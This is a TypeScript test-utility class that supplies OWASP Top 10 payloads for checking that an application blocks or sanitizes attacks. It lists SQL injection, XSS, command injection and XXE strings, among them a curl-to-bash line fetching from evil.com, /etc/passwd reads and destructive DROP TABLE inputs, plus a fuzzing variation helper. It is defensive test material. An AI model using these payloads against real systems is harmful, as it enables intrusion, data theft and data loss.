/**
 * Security Payload Generator
 * Generates various security test payloads for OWASP Top 10 testing
 */

export interface SecurityPayload {
  payload: string;
  category: string;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  expectedResult: 'blocked' | 'sanitized' | 'logged';
}

export class SecurityPayloadGenerator {
  /**
   * SQL Injection payloads based on OWASP recommendations
   */
  static getSQLInjectionPayloads(): SecurityPayload[] {
    return [
      // Union-based injection
      {
        payload: "' UNION SELECT username, password FROM users--",
        category: 'union_select',
        description: 'Union-based SQL injection',
        severity: 'critical',
        expectedResult: 'blocked'
      },
      {
        payload: "1' UNION SELECT NULL, table_name FROM information_schema.tables--",
        category: 'union_select',
        description: 'Information schema enumeration',
        severity: 'critical',
        expectedResult: 'blocked'
      },
      
      // Boolean-based blind injection
      {
        payload: "' OR '1'='1",
        category: 'boolean_blind',
        description: 'Classic boolean-based injection',
        severity: 'critical',
        expectedResult: 'blocked'
      },
      {
        payload: "' OR '1'='1' --",
        category: 'boolean_blind',
        description: 'Boolean injection with comment',
        severity: 'critical',
        expectedResult: 'blocked'
      },
      {
        payload: "admin' AND 1=1--",
        category: 'boolean_blind',
        description: 'Authentication bypass attempt',
        severity: 'critical',
        expectedResult: 'blocked'
      },
      
      // Time-based blind injection
      {
        payload: "'; WAITFOR DELAY '00:00:05'--",
        category: 'time_based',
        description: 'SQL Server time-based injection',
        severity: 'high',
        expectedResult: 'blocked'
      },
      {
        payload: "' OR SLEEP(5)--",
        category: 'time_based',
        description: 'MySQL time-based injection',
        severity: 'high',
        expectedResult: 'blocked'
      },
      {
        payload: "'; SELECT pg_sleep(5)--",
        category: 'time_based',
        description: 'PostgreSQL time-based injection',
        severity: 'high',
        expectedResult: 'blocked'
      },
      
      // Drop table attempts
      {
        payload: "'; DROP TABLE users; --",
        category: 'drop_table',
        description: 'Destructive SQL injection',
        severity: 'critical',
        expectedResult: 'blocked'
      },
      {
        payload: "'; DELETE FROM prompts WHERE 1=1; --",
        category: 'drop_table',
        description: 'Mass deletion attempt',
        severity: 'critical',
        expectedResult: 'blocked'
      },
      
      // Header injection
      {
        payload: "X-Forwarded-For: ' OR 1=1--",
        category: 'headers',
        description: 'Header-based SQL injection',
        severity: 'high',
        expectedResult: 'blocked'
      },
      
      // Cookie injection
      {
        payload: "session_id=' OR '1'='1",
        category: 'cookies',
        description: 'Cookie-based SQL injection',
        severity: 'high',
        expectedResult: 'blocked'
      }
    ];
  }
  
  /**
   * XSS payloads covering various attack vectors
   */
  static getXSSPayloads(): SecurityPayload[] {
    return [
      // Script tag injection
      {
        payload: '<script>alert("XSS")</script>',
        category: 'script_tags',
        description: 'Basic script tag XSS',
        severity: 'critical',
        expectedResult: 'sanitized'
      },
      {
        payload: '<script>document.cookie</script>',
        category: 'script_tags',
        description: 'Cookie theft attempt',
        severity: 'critical',
        expectedResult: 'sanitized'
      },
      {
        payload: '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
        category: 'script_tags',
        description: 'External script injection',
        severity: 'critical',
        expectedResult: 'sanitized'
      },
      
      // Event handler injection
      {
        payload: '<img src=x onerror=alert(1)>',
        category: 'event_handlers',
        description: 'Image onerror XSS',
        severity: 'critical',
        expectedResult: 'sanitized'
      },
      {
        payload: '<body onload=alert(1)>',
        category: 'event_handlers',
        description: 'Body onload XSS',
        severity: 'critical',
        expectedResult: 'sanitized'
      },
      {
        payload: '<input onfocus=alert(1) autofocus>',
        category: 'event_handlers',
        description: 'Input autofocus XSS',
        severity: 'critical',
        expectedResult: 'sanitized'
      },
      
      // JavaScript URL injection
      {
        payload: '<a href="javascript:alert(1)">Click</a>',
        category: 'javascript_urls',
        description: 'JavaScript URL XSS',
        severity: 'high',
        expectedResult: 'sanitized'
      },
      {
        payload: '<iframe src="javascript:alert(1)">',
        category: 'javascript_urls',
        description: 'Iframe JavaScript URL',
        severity: 'high',
        expectedResult: 'sanitized'
      },
      
      // SVG payload injection
      {
        payload: '<svg onload=alert(1)>',
        category: 'svg_payloads',
        description: 'SVG onload XSS',
        severity: 'high',
        expectedResult: 'sanitized'
      },
      {
        payload: '<svg/onload=alert(1)>',
        category: 'svg_payloads',
        description: 'SVG with slash bypass',
        severity: 'high',
        expectedResult: 'sanitized'
      },
      
      // DOM-based XSS
      {
        payload: '#<script>alert(1)</script>',
        category: 'dom_based_xss',
        description: 'Hash-based DOM XSS',
        severity: 'high',
        expectedResult: 'sanitized'
      },
      {
        payload: '?search=<script>alert(1)</script>',
        category: 'dom_based_xss',
        description: 'Query parameter DOM XSS',
        severity: 'high',
        expectedResult: 'sanitized'
      },
      
      // Encoded payloads
      {
        payload: '&lt;script&gt;alert(1)&lt;/script&gt;',
        category: 'encoded_xss',
        description: 'HTML entity encoded XSS',
        severity: 'medium',
        expectedResult: 'sanitized'
      },
      {
        payload: '%3Cscript%3Ealert(1)%3C/script%3E',
        category: 'encoded_xss',
        description: 'URL encoded XSS',
        severity: 'medium',
        expectedResult: 'sanitized'
      }
    ];
  }
  
  /**
   * Authentication attack payloads
   */
  static getAuthenticationPayloads(): SecurityPayload[] {
    return [
      // Brute force attempts
      {
        payload: JSON.stringify({ 
          attempts: Array(10).fill({ username: 'admin', password: 'password123' })
        }),
        category: 'brute_force',
        description: 'Rapid login attempts',
        severity: 'high',
        expectedResult: 'blocked'
      },
      
      // Weak passwords
      {
        payload: 'password',
        category: 'weak_password',
        description: 'Common weak password',
        severity: 'medium',
        expectedResult: 'blocked'
      },
      {
        payload: '12345678',
        category: 'weak_password',
        description: 'Numeric weak password',
        severity: 'medium',
        expectedResult: 'blocked'
      },
      {
        payload: 'qwerty',
        category: 'weak_password',
        description: 'Keyboard pattern password',
        severity: 'medium',
        expectedResult: 'blocked'
      },
      
      // Timing attack patterns
      {
        payload: JSON.stringify({
          validUser: 'admin@example.com',
          invalidUser: 'nonexistent@example.com',
          measureTiming: true
        }),
        category: 'timing_attacks',
        description: 'Username enumeration via timing',
        severity: 'medium',
        expectedResult: 'logged'
      },
      
      // Password reset vulnerabilities
      {
        payload: JSON.stringify({
          email: 'victim@example.com',
          resetToken: 'predictable123'
        }),
        category: 'password_reset',
        description: 'Predictable reset token',
        severity: 'high',
        expectedResult: 'blocked'
      }
    ];
  }
  
  /**
   * Session management attack payloads
   */
  static getSessionPayloads(): SecurityPayload[] {
    return [
      // Session fixation
      {
        payload: 'session_id=known_session_123',
        category: 'session_fixation',
        description: 'Session fixation attempt',
        severity: 'high',
        expectedResult: 'blocked'
      },
      
      // Predictable session IDs
      {
        payload: JSON.stringify({
          sessions: ['sess_1', 'sess_2', 'sess_3', 'sess_4']
        }),
        category: 'predictable_session',
        description: 'Sequential session IDs',
        severity: 'high',
        expectedResult: 'logged'
      },
      
      // CSRF attempts
      {
        payload: '<form action="/api/v1/user/delete" method="POST"><input type="submit"></form>',
        category: 'csrf',
        description: 'CSRF form submission',
        severity: 'high',
        expectedResult: 'blocked'
      },
      
      // Session hijacking
      {
        payload: JSON.stringify({
          stolenSession: 'victim_session_id',
          attackerIP: '192.168.1.100'
        }),
        category: 'session_hijacking',
        description: 'Session hijacking attempt',
        severity: 'critical',
        expectedResult: 'blocked'
      }
    ];
  }
  
  /**
   * Command injection payloads
   */
  static getCommandInjectionPayloads(): SecurityPayload[] {
    return [
      {
        payload: '; ls -la',
        category: 'command_injection',
        description: 'Unix command injection',
        severity: 'critical',
        expectedResult: 'blocked'
      },
      {
        payload: '| whoami',
        category: 'command_injection',
        description: 'Pipe command injection',
        severity: 'critical',
        expectedResult: 'blocked'
      },
      {
        payload: '`cat /etc/passwd`',
        category: 'command_injection',
        description: 'Backtick command injection',
        severity: 'critical',
        expectedResult: 'blocked'
      },
      {
        payload: '$(curl http://evil.com/shell.sh | bash)',
        category: 'command_injection',
        description: 'Remote code execution attempt',
        severity: 'critical',
        expectedResult: 'blocked'
      }
    ];
  }
  
  /**
   * XXE (XML External Entity) payloads
   */
  static getXXEPayloads(): SecurityPayload[] {
    return [
      {
        payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>`,
        category: 'xxe',
        description: 'File disclosure XXE',
        severity: 'critical',
        expectedResult: 'blocked'
      },
      {
        payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://evil.com/data">
]>
<data>&xxe;</data>`,
        category: 'xxe',
        description: 'SSRF via XXE',
        severity: 'high',
        expectedResult: 'blocked'
      }
    ];
  }
  
  /**
   * Get all payloads for a specific category
   */
  static getPayloadsByCategory(category: string): SecurityPayload[] {
    switch (category) {
      case 'sql_injection':
        return this.getSQLInjectionPayloads();
      case 'xss':
        return this.getXSSPayloads();
      case 'authentication':
        return this.getAuthenticationPayloads();
      case 'session':
        return this.getSessionPayloads();
      case 'command_injection':
        return this.getCommandInjectionPayloads();
      case 'xxe':
        return this.getXXEPayloads();
      default:
        return [];
    }
  }
  
  /**
   * Get all critical severity payloads
   */
  static getCriticalPayloads(): SecurityPayload[] {
    const allPayloads = [
      ...this.getSQLInjectionPayloads(),
      ...this.getXSSPayloads(),
      ...this.getAuthenticationPayloads(),
      ...this.getSessionPayloads(),
      ...this.getCommandInjectionPayloads(),
      ...this.getXXEPayloads()
    ];
    
    return allPayloads.filter(p => p.severity === 'critical');
  }
  
  /**
   * Generate random variations of a payload for fuzzing
   */
  static generateVariations(basePayload: string, count: number = 10): string[] {
    const variations: string[] = [basePayload];
    const modifiers = [
      (s: string) => s.toUpperCase(),
      (s: string) => s.toLowerCase(),
      (s: string) => s.replace(/'/g, '"'),
      (s: string) => s.replace(/"/g, "'"),
      (s: string) => s.replace(/ /g, '/**/'),
      (s: string) => s.replace(/ /g, '+'),
      (s: string) => encodeURIComponent(s),
      (s: string) => btoa(s), // Base64 encode
      (s: string) => s.split('').join(' '),
      (s: string) => s.replace(/=/g, ' = ')
    ];
    
    for (let i = 1; i < count && i < modifiers.length; i++) {
      variations.push(modifiers[i](basePayload));
    }
    
    return variations;
  }
}